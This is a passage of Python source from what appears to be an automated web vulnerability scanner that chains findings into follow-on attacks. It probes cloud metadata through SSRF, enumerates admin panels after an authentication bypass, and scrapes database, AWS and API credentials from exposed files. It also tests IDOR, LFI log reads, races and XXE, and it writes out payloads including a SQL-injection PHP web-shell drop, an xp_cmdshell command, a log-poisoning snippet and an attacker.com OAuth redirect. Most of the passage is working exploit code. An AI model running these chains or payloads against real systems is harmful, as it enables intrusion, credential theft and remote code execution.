                    if "google.internal" in target_url:
                        headers = {"Metadata-Flavor": "Google"}

                    if method == "POST":
                        resp = await client.post(url, data={param: target_url})
                    else:
                        resp = await client.get(url, params={param: target_url})

                    if resp.status_code == 200:
                        body = resp.text
                        if any(ind in body for ind in indicators):
                            cloud_accessible.append({
                                "target": target_url,
                                "description": description,
                                "snippet": body[:300],
                            })
                except Exception:
                    continue

        if cloud_accessible:
            evidence.append({
                "step": 3,
                "action": "Accessed cloud metadata services via SSRF",
                "result": f"Cloud metadata accessible: {', '.join(c['description'] for c in cloud_accessible)}",
            })
            steps_completed = 3
        else:
            evidence.append({
                "step": 3,
                "action": "Probed cloud metadata services",
                "result": "Cloud metadata not accessible (IMDSv2 or not in cloud environment)",
            })
            steps_completed = 3

        # Step 4: Summary of accessible services
        all_accessible = accessible_internal + cloud_accessible
        if all_accessible:
            evidence.append({
                "step": 4,
                "action": "Compiled internal access report",
                "result": f"Total accessible: {len(all_accessible)} internal services/endpoints",
            })
            steps_completed = 4

        return {
            "steps_completed": steps_completed,
            "evidence": evidence,
            "impact": (
                "SSRF allows access to internal network. "
                + (f"Internal services: {', '.join(a['description'] for a in accessible_internal[:3])}. "
                   if accessible_internal else "")
                + (f"Cloud metadata: {', '.join(c['description'] for c in cloud_accessible[:3])}. "
                   if cloud_accessible else "")
                + (f"Total {len(all_accessible)} internal endpoints accessible."
                   if all_accessible else "Network appears segmented.")
            ),
            "verified": bool(all_accessible),
        }

    async def _exec_auth_bypass_admin(self, trigger: dict, ctx: dict) -> dict:
        """Auth Bypass -> Admin Panel -> Admin Function Enumeration chain."""
        url = trigger.get("url", "")
        base_url = ctx.get("base_url", "")
        evidence = []
        steps_completed = 0

        # Step 1: Confirm auth bypass
        evidence.append({
            "step": 1,
            "action": f"Authentication bypass confirmed at {url}",
            "result": "Access granted without proper credentials",
        })
        steps_completed = 1

        # Step 2: Try to access common admin paths
        admin_paths = [
            "/admin", "/admin/", "/administrator", "/admin/dashboard",
            "/admin/panel", "/manage", "/management", "/dashboard",
            "/admin/users", "/admin/settings", "/admin/config",
            "/wp-admin/", "/cpanel", "/phpmyadmin/",
        ]

        admin_accessible = []
        async with make_client(timeout=10.0) as client:
            for path in admin_paths:
                try:
                    test_url = (base_url or url).rstrip("/") + path
                    resp = await client.get(test_url)
                    if resp.status_code == 200 and len(resp.text) > 100:
                        # Skip SPA shells (React/Vue/Angular routing)
                        from app.utils.spa_detector import is_spa_shell
                        content_type = resp.headers.get("content-type", "")
                        if is_spa_shell(resp.text, content_type):
                            continue
                        # Check for admin-like content
                        body_lower = resp.text.lower()
                        if any(ind in body_lower for ind in
                               ["admin", "dashboard", "manage", "users",
                                "settings", "configuration", "panel"]):
                            admin_accessible.append(path)
                except Exception:
                    continue

        if admin_accessible:
            evidence.append({
                "step": 2,
                "action": "Accessed admin panel endpoints",
                "result": f"Admin paths accessible: {', '.join(admin_accessible[:5])}",
            })
            steps_completed = 2
        else:
            evidence.append({
                "step": 2,
                "action": "Probed common admin paths",
                "result": "No standard admin panels found at common paths",
            })
            steps_completed = 2

        # Step 3: Enumerate admin functions
        admin_functions = []
        if admin_accessible:
            async with make_client(timeout=10.0) as client:
                for path in admin_accessible[:3]:
                    try:
                        test_url = (base_url or url).rstrip("/") + path
                        resp = await client.get(test_url)
                        body = resp.text

                        # Extract links from admin pages
                        links = re.findall(r'href=["\']([^"\']*)["\']', body, re.IGNORECASE)
                        for link in links:
                            link_lower = link.lower()
                            if any(kw in link_lower for kw in
                                   ["user", "setting", "config", "export",
                                    "backup", "log", "report", "delete",
                                    "create", "edit", "manage"]):
                                admin_functions.append(link)
                    except Exception:
                        continue

        if admin_functions:
            unique_funcs = list(set(admin_functions))[:10]
            evidence.append({
                "step": 3,
                "action": "Enumerated admin functions",
                "result": f"Admin functions: {', '.join(unique_funcs[:5])}",
            })
            steps_completed = 3
        else:
            evidence.append({
                "step": 3,
                "action": "Attempted admin function enumeration",
                "result": "Could not enumerate specific admin functions",
            })
            steps_completed = 3

        return {
            "steps_completed": steps_completed,
            "evidence": evidence,
            "impact": (
                "Authentication bypass grants unauthorized access. "
                + (f"Admin panels: {', '.join(admin_accessible[:3])}. " if admin_accessible else "")
                + (f"Admin functions discovered: {len(admin_functions)}" if admin_functions else "")
            ),
            "verified": bool(admin_accessible),
        }

    async def _exec_info_disclosure_further(self, trigger: dict, ctx: dict) -> dict:
        """Info Disclosure -> Extract Credentials -> Test Access chain."""
        url = trigger.get("url", "")
        base_url = ctx.get("base_url", "")
        evidence = []
        steps_completed = 0

        # Step 1: Confirm info disclosure
        evidence.append({
            "step": 1,
            "action": f"Sensitive file exposed at {url}",
            "result": "Configuration/environment file accessible",
        })
        steps_completed = 1

        if not url:
            return {
                "steps_completed": 1,
                "evidence": evidence,
                "impact": "Information disclosure confirmed.",
                "verified": False,
            }

        # Step 2: Fetch the exposed file and extract credentials
        creds_found = []
        api_keys_found = []

        async with make_client(timeout=10.0) as client:
            try:
                resp = await client.get(url)
                if resp.status_code == 200:
                    body = resp.text

                    # Look for credential patterns
                    cred_patterns = [
                        (r'(?:DB_PASSWORD|DATABASE_PASSWORD|MYSQL_PASSWORD|POSTGRES_PASSWORD)\s*[=:]\s*["\']?(\S+)',
                         "Database password"),
                        (r'(?:DB_USER|DATABASE_USER|MYSQL_USER)\s*[=:]\s*["\']?(\S+)',
                         "Database user"),
                        (r'(?:DB_HOST|DATABASE_HOST|DATABASE_URL)\s*[=:]\s*["\']?(\S+)',
                         "Database host"),
                        (r'(?:SECRET_KEY|APP_SECRET|JWT_SECRET)\s*[=:]\s*["\']?(\S+)',
                         "Application secret"),
                        (r'(?:AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY)\s*[=:]\s*["\']?(\S+)',
                         "AWS credential"),
                        (r'(?:SMTP_PASSWORD|MAIL_PASSWORD|EMAIL_PASSWORD)\s*[=:]\s*["\']?(\S+)',
                         "Email password"),
                        (r'(?:REDIS_URL|REDIS_PASSWORD)\s*[=:]\s*["\']?(\S+)',
                         "Redis credential"),
                    ]

                    for pattern, desc in cred_patterns:
                        matches = re.findall(pattern, body, re.IGNORECASE)
                        for match in matches:
                            # Mask the actual credential
                            masked = match[:3] + "***" if len(match) > 3 else "***"
                            creds_found.append(f"{desc}: {masked}")

                    # Look for API keys
                    api_patterns = [
                        (r'(?:STRIPE_SECRET_KEY|sk_live_)\S+', "Stripe API key"),
                        (r'(?:SENDGRID_API_KEY|SG\.)\S+', "SendGrid API key"),
                        (r'(?:TWILIO_AUTH_TOKEN)\s*[=:]\s*\S+', "Twilio token"),
                        (r'ghp_[A-Za-z0-9_]{36}', "GitHub personal access token"),
                        (r'xox[bpsa]-[A-Za-z0-9-]+', "Slack token"),
                    ]

                    for pattern, desc in api_patterns:
                        if re.search(pattern, body, re.IGNORECASE):
                            api_keys_found.append(desc)
            except Exception:
                pass

        all_creds = creds_found + api_keys_found
        if all_creds:
            evidence.append({
                "step": 2,
                "action": "Extracted credentials from exposed file",
                "result": f"Found {len(all_creds)} credentials: {', '.join(all_creds[:5])}",
            })
            steps_completed = 2
        else:
            evidence.append({
                "step": 2,
                "action": "Analyzed exposed file for credentials",
                "result": "No obvious credentials found in exposed file",
            })
            steps_completed = 2

        # Step 3: Check if exposed services are reachable
        services_reachable = []
        if creds_found:
            # Try common internal service ports
            service_urls = [
                (f"{base_url}:3306", "MySQL"),
                (f"{base_url}:5432", "PostgreSQL"),
                (f"{base_url}:6379", "Redis"),
                (f"{base_url}:27017", "MongoDB"),
            ]
            async with make_client(timeout=5.0) as client:
                for svc_url, svc_name in service_urls:
                    try:
                        resp = await client.get(svc_url)
                        if resp.status_code not in (0,):
                            services_reachable.append(svc_name)
                    except Exception:
                        continue

        if services_reachable:
            evidence.append({
                "step": 3,
                "action": "Tested connectivity to services using leaked credentials",
                "result": f"Reachable services: {', '.join(services_reachable)}",
            })
            steps_completed = 3
        else:
            evidence.append({
                "step": 3,
                "action": "Tested connectivity to backend services",
                "result": "Backend services not directly reachable from external network",
            })
            steps_completed = 3

        return {
            "steps_completed": steps_completed,
            "evidence": evidence,
            "impact": (
                "Sensitive file exposure reveals internal configuration. "
                + (f"Credentials found: {', '.join(all_creds[:3])}. " if all_creds else "")
                + ("Leaked credentials pose risk of unauthorized access to backend services."
                   if creds_found else "")
            ),
            "verified": bool(all_creds),
        }

    # ═══════════════════════════════════════════════════════════════════
    # Legacy Chain Test Methods (kept for backward compatibility)
    # ═══════════════════════════════════════════════════════════════════

    async def _chain_ssrf_metadata(self, trigger, vulns, base_url, ctx) -> dict:
        """Test if SSRF can reach cloud metadata."""
        url = trigger.get("url", "")
        param = trigger.get("parameter", "")
        if not url or not param:
            return {"verified": False}

        metadata_urls = [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/computeMetadata/v1/",
            "http://100.100.100.200/latest/meta-data/",
        ]

        async with make_client(timeout=5.0) as client:
            for meta_url in metadata_urls:
                try:
                    if trigger.get("method", "GET").upper() == "POST":
                        resp = await client.post(url, data={param: meta_url})
                    else:
                        resp = await client.get(url, params={param: meta_url})

                    if resp.status_code == 200 and any(
                        ind in resp.text for ind in ("ami-id", "instance-id", "iam", "computeMetadata")
                    ):
                        return {
                            "verified": True,
                            "evidence": {
                                "metadata_url": meta_url,
                                "response_snippet": resp.text[:300],
                            },
                        }
                except Exception:
                    continue

        return {"verified": False}

    async def _chain_xss_session_steal(self, trigger, vulns, base_url, ctx) -> dict:
        """Check if XSS can steal httpOnly cookies (it can't if httpOnly is set).

        Only verified if the site actually sets cookies AND they lack httpOnly.
        No cookies = no session to steal = not verified.
        """
        async with make_client(timeout=5.0) as client:
            try:
                resp = await client.get(base_url)
                cookies_header = resp.headers.get("set-cookie", "")

                # No cookies at all = no session to steal
                if not cookies_header:
                    return {
                        "verified": False,
                        "evidence": {
                            "cookie_header": "no cookies set",
                            "reason": "No session cookies to steal",
                        },
                    }

                has_httponly = "httponly" in cookies_header.lower()
                has_secure = "secure" in cookies_header.lower()

                return {
                    "verified": not has_httponly,
                    "evidence": {
                        "httponly_missing": not has_httponly,
                        "secure_missing": not has_secure,
                        "cookie_header": cookies_header[:200],
                        "xss_url": trigger.get("url", ""),
                    },
                }
            except Exception:
                return {"verified": False}

    async def _chain_sqli_rce(self, trigger, vulns, base_url, ctx) -> dict:
        """Check if SQL injection could lead to RCE (INTO OUTFILE, xp_cmdshell)."""
        url = trigger.get("url", "")
        param = trigger.get("parameter", "")
        payload = trigger.get("payload_used", "")

        evidence = {
            "sqli_url": url,
            "sqli_param": param,
            "rce_potential": False,
        }

        techs = ctx.get("technologies", {}).get("summary", {})
        tech_names = [t.lower() for t in techs.keys()]

        if any(t in tech_names for t in ("mysql", "mariadb")):
            evidence["rce_potential"] = True
            evidence["method"] = "MySQL INTO OUTFILE (requires FILE privilege)"
            evidence["test_payload"] = f"{payload} UNION SELECT '<?php system($_GET[\"c\"]);?>' INTO OUTFILE '/var/www/html/shell.php'--"
        elif any(t in tech_names for t in ("mssql", "sql server")):
            evidence["rce_potential"] = True
            evidence["method"] = "MSSQL xp_cmdshell"
            evidence["test_payload"] = f"{payload}; EXEC xp_cmdshell('whoami')--"

        return {
            "verified": False,
            "evidence": evidence,
        }

    async def _chain_redirect_oauth(self, trigger, vulns, base_url, ctx) -> dict:
        """Check if open redirect is on an OAuth-enabled app."""
        async with make_client(timeout=5.0) as client:
            try:
                resp = await client.get(base_url)
                body = resp.text.lower()

                has_oauth = any(
                    ind in body
                    for ind in ("oauth", "openid", "authorize", "client_id", "redirect_uri",
                                "google-signin", "facebook-login", "sign in with")
                )

                return {
                    "verified": has_oauth,
                    "evidence": {
                        "redirect_url": trigger.get("url", ""),
                        "oauth_detected": has_oauth,
                        "attack": "Craft: /authorize?redirect_uri=<open_redirect_url>->attacker.com",
                    },
                }
            except Exception:
                return {"verified": False}

    async def _chain_info_to_injection(self, trigger, vulns, base_url, ctx) -> dict:
        """Check if info disclosure reveals endpoints we can test for injection."""
        has_injection = bool(
            vulns.get("sqli") or vulns.get("sqli_blind") or
            vulns.get("xss_reflected") or vulns.get("cmd_injection")
        )

        return {
            "verified": has_injection,
            "evidence": {
                "info_url": trigger.get("url", ""),
                "injection_found": has_injection,
                "chain": "Info disclosure may have helped discover injectable endpoints",
            },
        }

    async def _chain_idor_enumeration(self, trigger, vulns, base_url, ctx) -> dict:
        """Test if IDOR is enumerable (sequential IDs)."""
        url = trigger.get("url", "")
        if not url:
            return {"verified": False}

        id_match = re.search(r'/(\d+)(?:/|$|\?)', url)
        if not id_match:
            return {"verified": False}

        original_id = int(id_match.group(1))
        test_ids = [original_id + 1, original_id - 1, original_id + 100]

        accessible = 0
        async with make_client(timeout=5.0) as client:
            for test_id in test_ids:
                test_url = url.replace(f"/{original_id}", f"/{test_id}")
                try:
                    resp = await client.get(test_url)
                    if resp.status_code == 200 and len(resp.text) > 50:
                        accessible += 1
                except Exception:
                    continue

        return {
            "verified": accessible >= 2,
            "evidence": {
                "idor_url": url,
                "ids_tested": len(test_ids),
                "ids_accessible": accessible,
                "enumerable": accessible >= 2,
            },
        }

    async def _chain_lfi_rce(self, trigger, vulns, base_url, ctx) -> dict:
        """Check if LFI can read log files (prerequisite for log poisoning)."""
        url = trigger.get("url", "")
        param = trigger.get("parameter", "")
        if not url or not param:
            return {"verified": False}

        log_paths = [
            "/var/log/apache2/access.log",
            "/var/log/nginx/access.log",
            "/var/log/httpd/access_log",
            "/proc/self/environ",
        ]

        async with make_client(timeout=5.0) as client:
            for log_path in log_paths:
                try:
                    resp = await client.get(url, params={param: log_path})
                    if resp.status_code == 200 and any(
                        ind in resp.text for ind in ("GET /", "HTTP/1", "Mozilla", "SERVER_", "PATH=")
                    ):
                        return {
                            "verified": True,
                            "evidence": {
                                "log_path": log_path,
                                "readable": True,
                                "rce_method": "Log poisoning: inject <?php system($_GET['c']);?> via User-Agent, then include log",
                            },
                        }
                except Exception:
                    continue

        return {"verified": False}

    async def _chain_race_financial(self, trigger, vulns, base_url, ctx) -> dict:
        """Verify race condition for financial impact. Only valid on state-changing endpoints."""
        url = trigger.get("url", "")
        method = trigger.get("method", "GET").upper()

        # Race conditions only matter on state-changing operations
        if method == "GET":
            return {
                "verified": False,
                "reason": "GET endpoints are read-only — race condition does not cause double-spend",
            }

        # Must have a URL that suggests financial/transactional operation
        financial_keywords = ("transfer", "payment", "withdraw", "deposit", "order",
                              "purchase", "checkout", "transaction", "send", "buy")
        path = url.lower()
        if not any(kw in path for kw in financial_keywords):
            return {
                "verified": False,
                "reason": f"Endpoint {url} does not appear to be a financial transaction",
            }

        # Actually test with parallel requests
        try:
            async with make_client() as client:
                # Send 5 parallel requests
                tasks = [client.request(method, url) for _ in range(5)]
                responses = await asyncio.gather(*tasks, return_exceptions=True)

                valid = [r for r in responses if not isinstance(r, Exception)]
                if not valid:
                    return {"verified": False, "reason": "All requests failed"}

                # Check if any response indicates duplicate processing
                status_codes = [r.status_code for r in valid]
                bodies = [r.text[:500] for r in valid]

                # If all responses are identical, no race condition evidence
                if len(set(status_codes)) == 1 and len(set(bodies)) == 1:
                    return {"verified": False, "reason": "All responses identical — no race evidence"}

                return {
                    "verified": True,
                    "evidence": {
                        "race_url": url,
                        "method": method,
                        "parallel_requests": len(valid),
                        "unique_status_codes": list(set(status_codes)),
                        "response_variation": len(set(bodies)) > 1,
                        "impact": "Potential double-spend if responses differ under parallel load",
                    },
                }
        except Exception as e:
            return {"verified": False, "reason": f"Test failed: {e}"}

    async def _chain_csrf_takeover(self, trigger, vulns, base_url, ctx) -> dict:
        """Check if CSRF affects account-critical endpoints."""
        url = trigger.get("url", "").lower()
        critical_patterns = [
            "email", "password", "account", "profile", "settings",
            "admin", "role", "permission", "transfer", "payment",
        ]

        is_critical = any(p in url for p in critical_patterns)

        return {
            "verified": is_critical,
            "evidence": {
                "csrf_url": trigger.get("url", ""),
                "affects_critical_function": is_critical,
                "attack": "Craft HTML page with auto-submitting form to change victim's email/password",
            },
        }

    async def _chain_xxe_ssrf(self, trigger, vulns, base_url, ctx) -> dict:
        """Verify XXE -> internal network access chain by testing XML endpoint."""
        url = trigger.get("url", "")
        method = trigger.get("method", "GET").upper()

        # XXE requires endpoints that accept XML input
        if method == "GET":
            return {
                "verified": False,
                "reason": "GET endpoint does not accept XML body — XXE not applicable",
            }

        # Try sending an XXE payload to see if the endpoint processes XML
        xxe_test = '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe "xxe_canary">]><root>&xxe;</root>'
        try:
            async with make_client() as client:
                resp = await client.request(
                    method, url,
                    content=xxe_test,
                    headers={"Content-Type": "application/xml"},
                )
                # Check if the server processed the XML entity
                if "xxe_canary" in resp.text:
                    return {
                        "verified": True,
                        "evidence": {
                            "xxe_url": url,
                            "entity_resolved": True,
                            "internal_targets": [
                                "http://169.254.169.254/ (cloud metadata)",
                            ],
                            "method": "XXE SYSTEM entity resolved — internal SSRF possible",
                        },
                    }
                return {
                    "verified": False,
                    "reason": "Server did not resolve XML entity — XXE not confirmed",
                }
        except Exception as e:
            return {"verified": False, "reason": f"XXE test failed: {e}"}

    # ── New chain test methods that delegate to executors ──

    async def _chain_sqli_data_exfil(self, trigger, vulns, base_url, ctx) -> dict:
        """Test SQLi data exfil chain."""
        result = await self._exec_sqli_data_exfil(trigger, ctx)
        return {"verified": result.get("verified", False), "evidence": result}

    async def _chain_idor_privilege_escalation(self, trigger, vulns, base_url, ctx) -> dict:
        """Test IDOR privilege escalation chain."""
        result = await self._exec_idor_privilege_escalation(trigger, ctx)
        return {"verified": result.get("verified", False), "evidence": result}

    async def _chain_file_upload_rce(self, trigger, vulns, base_url, ctx) -> dict:
        """Test file upload RCE chain."""
        result = await self._exec_file_upload_rce(trigger, ctx)
        return {"verified": result.get("verified", False), "evidence": result}

    async def _chain_xss_session_hijack(self, trigger, vulns, base_url, ctx) -> dict:
        """Test XSS session hijack chain."""
        result = await self._exec_xss_session_hijack(trigger, ctx)
        return {"verified": result.get("verified", False), "evidence": result}

    async def _chain_ssrf_internal_scan(self, trigger, vulns, base_url, ctx) -> dict:
        """Test SSRF internal scan chain."""
        result = await self._exec_ssrf_internal_scan(trigger, ctx)
        return {"verified": result.get("verified", False), "evidence": result}

    async def _chain_auth_bypass_admin(self, trigger, vulns, base_url, ctx) -> dict:
        """Test auth bypass admin chain."""
        result = await self._exec_auth_bypass_admin(trigger, ctx)
        return {"verified": result.get("verified", False), "evidence": result}

    async def _chain_info_disclosure_further(self, trigger, vulns, base_url, ctx) -> dict:
        """Test info disclosure further attack chain."""
        result = await self._exec_info_disclosure_further(trigger, ctx)
        return {"verified": result.get("verified", False), "evidence": result}
